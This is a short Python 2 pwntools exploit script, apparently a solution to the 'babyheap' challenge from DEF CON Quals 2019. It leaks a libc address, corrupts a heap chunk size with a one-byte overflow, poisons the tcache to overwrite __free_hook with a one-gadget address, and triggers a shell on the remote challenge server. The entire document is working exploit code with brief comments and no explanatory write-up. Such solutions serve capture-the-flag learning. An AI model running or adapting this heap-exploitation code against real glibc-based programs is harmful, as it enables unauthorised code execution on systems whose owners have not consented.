#!/usr/bin/python2

from pwn import *
import sys

def add(size, data):
    p.sendlineafter("> ", "M")
    p.sendlineafter("> ", str(size))
    p.sendlineafter("> ", data)

def free(index):
    p.sendlineafter("> ", "F")
    p.sendlineafter("> ", str(index))

def show(index):
    p.sendlineafter("> ", "S")
    p.sendlineafter("> ", str(index))

with context.quiet:
    p = remote('babyheap.quals2019.oooverflow.io', 5000)
    #p = process('./babyheap', env = { 'LD_PRELOAD' : './libc.so' })

    libc=ELF('./libc.so')

    # Fill up tcache bins
    for i in range(9): #8+1, in order to prevent top chunk consolidation
        add(0x178, "")
    for i in range(8):
        free(i)

    # Leak libc
    add(0xf8, "")  #[0] Request is served by unsorted bin
    show(0)
    libc_leak = u64(p.recvline()[:-1].ljust(8, "\0"))
    libc_system = libc_leak - 0x191e40
    libc.address= libc_system-libc.symbols['system']
    oneGadget=libc.address+0xe2383
    print "Libc base: %s" % hex(libc.address)
    print "Libc __free_hook: %s" % hex(libc.symbols['__free_hook'])
    print "oneGadget: %s" % hex(oneGadget)

    # Clean up mess
    add(0xf8, "")  #[1] Clear out the unsortedbin
    add(0x178, "") #[2] Make room in tcachebin
    add(0x178, "") #[3] Make room in tcachebin

    # Tcache poisoning
    add(0xf8, "A") #[4]
    add(0xf8, "B") #[5]
    add(0xf8, "C") #[6]
    free(6)
    free(4)
    add(0xf8, "A"*0xf8 + "\x81") #[4] Overwrite [5] size
    free(5)
                                 #[5] Overwrite [6] fd pointer
    add(0x178, "B"*0x100 + p64(libc.symbols['__free_hook'])[0:6]) 

    # Overwrite
    add(0xf8, "") # Junk malloc
    add(0xf8, p64(oneGadget)[0:6]) # Write oneGadget to __free_hook

    # Pop shell by freeing, effectively calling oneGadget
    free(0)
    p.interactive()
